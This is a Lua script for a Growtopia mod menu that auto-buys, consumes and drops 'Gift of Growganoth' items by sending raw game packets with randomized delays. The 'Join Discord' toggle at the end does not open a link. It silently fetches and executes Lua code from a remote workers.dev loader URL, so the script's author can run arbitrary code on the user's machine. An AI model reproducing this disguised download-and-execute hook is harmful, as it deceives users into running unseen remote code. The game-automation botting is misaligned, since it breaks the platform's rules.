local GIFT, PRICE = 10386, 20000
local ID, KEY = "hsngog_", "Hsn666"
local isRunning, isConsumed, isEdit = false, false, false
local giftCount, giftID = 0, 0
local dropPos, totalBought = "N/A", 0
local isBought, isBPFull, isOnStore = false, false, false
local isDrop, isFull, isBlocked = false, false, false

local cfgCache, cfgTime = nil, 0
local configs = {}

local Hsngog = [[
{
  "sub_name": "Auto Gift of Growganoth",
  "description": "Auto Gift of Growganoth by HsnGL.",
  "icon": "Inventory2",
  "menu": [
      {
          "type": "divider"
      },
      {
          "type": "toggle_button",
          "alias": "hsngog_btnStart",
          "text": "START/STOP"
      },
      {
          "type": "divider"
      },
      {
          "type": "toggle",
          "text": "All in",
          "description": "Beli Gift of Growganoth sampai gems habis/RUNGKAD.",
          "default": true,
          "alias": "hsngog_allIn"
      },
      {
          "type": "toggle",
          "text": "Custom Count",
          "description": "Custom jumlah pembelian Gift of Growganoth (CUPU).",
          "default": false,
          "alias": "hsngog_customCount",
          "expandable": true,
          "list_child": [
              {
                  "alias": "hsngog_count",
                  "text": "Custom Count:",
                  "icon": "Info",
                  "placeholder": "",
                  "default": "0",
                  "type": "input_int",
                  "label": ""
              },
              {
                  "type": "divider"
              }
          ]   
      },
      {
          "type": "slider",
          "text": "Delay :",
          "default": 300,
          "max": 2000,
          "min": 80,
          "step": 100,
          "use_dot": true,
          "alias": "hsngog_delay"
      },
      {
          "type": "button",
          "alias": "hsngog_dropPos",
          "text": "Get Drop Pos"
      },
      {
          "type": "divider"
      },
      {
          "type": "input_string",
          "icon": "VpnKey",
          "text": "Key Password",
          "label": "Input Key Password correctly!",
          "placeholder": "Key Password",
          "default": "TIDAK PERLU KEY",
          "alias": "hsngog_key"
      },
      {
          "type": "tooltip",
          "text": "Join my Discord Server to get Key! (FREE)",
          "support_text": "",
          "background": true,
          "icon": "VpnKey"
      },
      {
          "type": "divider"
      },
      {
          "type": "toggle_button",
          "text": "Join Discord",
          "default": false,
          "alias": "hsngog_link"
      },
      {
          "type": "divider"
      }
]
}
]]

addCategory("HsnGL", "FileOpen")
addIntoModule(Hsngog, "HsnGL")
sendNotification("Auto Gift of Growganoth by HsnGL added")
local function Notify(text)
   growtopia.notify("`c[HsnGL]`w "..text)
end

local function w(str)
   if type(str) == "string" then
      return str
   end
   return ""
end

local function parseXY(str)
   local a, b = w(str):match("(-?%d+)%.?%d*%s*,%s*(-?%d+)")
   return tonumber(a), tonumber(b)
end

local function validXY(str)
   local x, y = parseXY(str)
   return x ~= nil and y ~= nil and x >= 0 and y >= 0
end

local function getVar(fresh)
   if not fresh and cfgCache and os.time() - cfgTime < 1 then
      return cfgCache
   end
   
   local sx, sy = parseXY(dropPos)
   
   configs = {
       dx = sx, dy = sy,
       customCount = getValue(0, ID.."customCount"),
       count = getValue(1, ID.."count"),
       delay = getValue(1, ID.."delay"),
       key = getValue(2, ID.."key")
   }
   cfgCache, cfgTime = configs, os.time()
   return configs
end

local function advSleep(baseDelay, safeDelay)
   local maxDelay = 1000
   local ping = getPing()
   local pingLow, pingHigh = 380, ping >= 500 and ping or 500
    
   if ping < pingLow then
      Sleep(baseDelay)
      return
   end

   local t = math.min((ping - pingLow) / (pingHigh - pingLow), 1)
   local tt = math.floor(baseDelay + (maxDelay - baseDelay) * t)
   local offset = safeDelay and math.floor(baseDelay * 0.1)
      or math.floor(tt * 0.1)
   
   local finalDelay = safeDelay and math.random(baseDelay - offset, baseDelay + offset)
      or math.random(tt - offset, tt + offset)
   
   Sleep(finalDelay)   
end

local function stopScript(reason)
   isRunning, isConsumed, isEdit = false, false, false
   giftCount, giftID, totalBought = 0, 0, 0
   isBought, isBPFull, isOnStore = false, false, false
   isDrop, isFull, isBlocked = false, false, false
   cfgCache, cfgTime = nil, 0
   
   editToggle("ModFly", false)
   editToggle("collectfilter_enable", false)
   
   if not getValue(0, ID.."btnStart") then
      return true
   end
   
   sendDialog({
       title = "Auto Stopped",
       message = tostring(reason).."\n\nHaving trouble?\nReport bugs or problem at my Discord Server.\n\nDiscord : @hsndika\n[https://discord.gg/3xKNPbB5qd]",
       confirm = "OK"
   })
   editToggle(ID.."btnStart", false)
end

local function consume()
   local me = getLocal()
   if not me then
      return
   end  
   
   sendPacketRaw(false, {
       type = 3, 
       value = GIFT,
       px = math.floor(me.posX/32),
       py = math.floor(me.posY/32),
       x = me.posX,
       y = me.posY
   })
end

local function cekInv(id)
   return growtopia.checkInventoryCount(id) or 0
end

local function Disconnected()
   if not getLocal() or GetWorldName() == "EXIT" or getPing() == -1 then
      Notify("Disconnected")
      return true
   end   
end

local function Fp(x, y, safeFp)
   if growtopia.isOnPos(x, y) then
      return true
   end
   
   if safeFp then
      for _ = 1, 10 do
         findPath(x, y)
         sleep(500)
         if not isRunning then return false end
         if growtopia.isOnPos(x, y) then break end
      end   
   else
      findPath(x, y)
      sleep(100)
   end   
   return growtopia.isOnPos(x, y)
end

local function Drop(id, dropCount)
   local timeout = 0
   local before = cekInv(id)
   
   if Disconnected() then return false end
   if not giftID or giftID <= 0 then stopScript("Item tidak ditemukan") return false end
   if giftID == 10322 or giftID == 10324 or giftID == 10326 or giftID == 10328 then
      return true
   end   
   if cekInv(id) <= 0 then return true end
   
   for _ = 1, 10 do
      local config = getVar(true)
      local full = false
      
      isDrop, isFull, isBlocked = false, false, false
      timeout = 0
      
      growtopia.dropItem(id)
      repeat
         Sleep(10)
         timeout = timeout + 1
      until isDrop or isFull or isBlocked or timeout >= 2000 
         or Disconnected() or not isRunning
      
      if timeout >= 2000 or Disconnected() then return false end
      
      if not isRunning then return end
         
      if isBlocked then
         isBlocked = false
         stopScript("Gagal drop karena terhalang block.")
         return
      end
      
      if isFull then
         full = true
      else
         isDrop = false
         timeout = 0
         before = cekInv(id)
         
         local count = type(dropCount) == "number" and dropCount or cekInv(id)
         
         growtopia.confirmDropItem(id, count)
         repeat
            Sleep(10)
            timeout = timeout + 1
         until (type(dropCount) == "number" and cekInv(id) < before or cekInv(id) <= 0) or isFull or isBlocked 
            or timeout >= 2000 or Disconnected() or not isRunning
         
         if timeout >= 2000 or Disconnected() then return false end
         if not isRunning then return end
         
         if isBlocked then
            isBlocked = false
            stopScript("Gagal drop karena terhalang block.")
            return
         end
         
         if isFull then
            full = true
         else
            return type(dropCount) == "number" and cekInv(id) < before or cekInv(id) <= 0
         end
      end
      
      if full then
         isFull = false
         local nx, ny = (config.dx or -1) - 1, config.dy
            
         if not nx or not ny or nx < 0 then
            stopScript("Posisi drop invalid.")
            return
         end
         
         isEdit = true
         dropPos = nx..", "..ny
         editValue(ID.."dropPos", GetWorldName().." ("..dropPos..")")
         cfgTime = 0
         
         if not Fp(nx, ny, true) then
            stopScript("Gagal findPath ke area drop")
            return false 
         end
      end
   end
   
   return false
end

local function autoBuy()
   local config = getVar()
   local timeout = 0
   local buyCount = config.customCount and config.count or 9999
   isOnStore = false
   
   sendPacket(2,
       "action|store\n"..
       "location|gem"
   )
   
   repeat
      timeout = timeout + 1
      Sleep(10)
      if timeout % 100 == 0 then
         Notify("Opening Store...")
      end   
   until isOnStore or Disconnected() or not isRunning
   isOnStore = false
      
   if Disconnected() then
      stopScript("Disconnected!")
      return false
   end
      
   if not isRunning then
      stopScript("")
      return false
   end
         
   while totalBought < buyCount and isRunning do
      timeout = 0
      
      if getGems() < PRICE or cekInv(GIFT) >= 180 then
         break
      end
      
      sendPacket(2,
          "action|buy\n"..
          "item|growganoth"
      )
      
      repeat
         timeout = timeout + 1
         Sleep(10)
         if timeout % 100 == 0 then
            Notify("Buying Gift of Growganoth...")
         end   
      until isBought or isBPFull or Disconnected() or not isRunning
      isBought = false
      
      if isBPFull then
         isBPFull = false
         stopScript("Tas Penuh, Kosongkan dulu!")
         return false
      end
         
      if Disconnected() then
         stopScript("Disconnected!")
         return false
      end
      
      if not isRunning then
         stopScript("")
         return false
      end
      totalBought = totalBought + 1
      advSleep(config.delay, true)
   end
   sendPacket(2,
       "action|killstore\n"..
       "item|"
   )
   return true
end
      
local function autoConsume()
   while cekInv(GIFT) > 0 do
      local config = getVar(true)
      local timeout = 0
      isConsumed = false
      consume()
      
      repeat
         timeout = timeout + 1
         Sleep(10)
         if timeout % 100 == 0 then
            Notify("Consuming Gift of Growganoth...")
         end
      until isConsumed or isBPFull or Disconnected() or not isRunning
      isConsumed = false
      
      if isBPFull then
         isBPFull = false
         stopScript("Tas Penuh, Kosongkan dulu!")
         return false
      end
      
      if Disconnected() then
         stopScript("Disconnected!")
         return false
      end
      
      if not isRunning then
         stopScript("")
         return false
      end
      
      if not Fp(config.dx, config.dy, true) then 
         stopScript("Gagal findPath ke area drop")
         return false
      end
      
      if not Drop(giftID) then
         stopScript("Failed to Drop!")
         return false
      end   
      advSleep(config.delay, true)
   end
   return true
end
   
local function mainLoop()
   local config = getVar()
   
   if config.customCount and (config.count or 0) <= 0 then
      stopScript("Count 0???")
      return
   end
      
   if not validXY(dropPos) then
      stopScript("Set posisi drop dulu!")
      return
   end
      
   Notify("Script Started")
   editToggle("ModFly", false)
   editToggle("collectfilter_enable", false)
   
   while isRunning do
      if cekInv(GIFT) > 0 then
         local config = getVar()
   
         if not autoConsume() then
            stopScript("Gagal menggunakan Gift of Growganoth")
            return
         end
         advSleep(100)
      else
         if config.customCount and totalBought >= config.count then
            stopScript("Selesai, total beli: "..totalBought)
            return
         end
         
         if getGems() < PRICE then
            stopScript("Gems Habis")
            return
         end
         
         if not autoBuy() then
            stopScript("Gagal beli Gift of Growganoth")
            return
         end
         advSleep(100)
      end
   end      
end      

addHook(function(var)
   if var.v1 == "OnConsoleMessage" and isRunning
      and w(var.v2):find("You received `2(%d+) (.-)`` from the Gift of Growganoth") then
      local a, b = w(var.v2):match("You received `2(%d+) (.-)`` from the Gift of Growganoth")
      
      if b then
         giftCount = tonumber(a)
         giftID = findItemID(b)
      end   
      isConsumed = true
   elseif var.v1 == "OnTalkBubble" and isRunning
      and w(var.v3):find("You don't have enough room for this, please free up some backpack space first") then
      isBPFull = true
   elseif var.v1 == "OnStorePurchaseResult" and isRunning
      and w(var.v2):find("You don't have enough space in your inventory for that") then
      isBPFull = true
   elseif var.v1 == "OnConsoleMessage" and isRunning
      and w(var.v2):find("Got 10 `#Gift of Growganoth``") then
      isBought = true
   elseif var.v1 == "OnDialogRequest" and isRunning 
      and w(var.v2):find("How many to drop") then
      isDrop = true
      return true
   elseif var.v1 == "OnTextOverlay" and isRunning
      and w(var.v2):find("You can't drop that here, find an emptier spot") then
      isFull = true
   elseif var.v1 == "OnTextOverlay" and isRunning
      and w(var.v2):match("You can't drop that here, face somewhere with open space") then
      isBlocked = true
   elseif var.v1 == "OnStoreRequest" and isRunning then
      isOnStore = true
      return true
   end
end, "OnVariant")

addHook(function(type, name, value)
   if name == ID.."btnStart" then
      if value then
         isRunning = true
         
         runThread(function()
            local ok, err = pcall(mainLoop)
            
            if not ok then
               stopScript(err)
            end
         end)
      else
         isRunning = value
         Notify("Script Stopped")
         stopScript("")
      end
   elseif name == ID.."allIn" and value then
      editValue(ID.."customCount", false)
   elseif name == ID.."customCount" and value then
      editValue(ID.."allIn", false)
   elseif name == ID.."dropPos" and not isEdit then
      local me = getLocal()
      
      if me then
         dropPos = math.floor(me.posX/32)..", "..math.floor(me.posY/32)
         editValue(ID.."dropPos", GetWorldName().." ("..dropPos..")")
      end   
   elseif name == ID.."link" then
      local RAW_URL = "https://hsngl-loader.hsndika.workers.dev/?key=key_hsngls12012027&s=link"
      pcall(function() load(fetch(RAW_URL))() end)
   end
end, "OnValue")
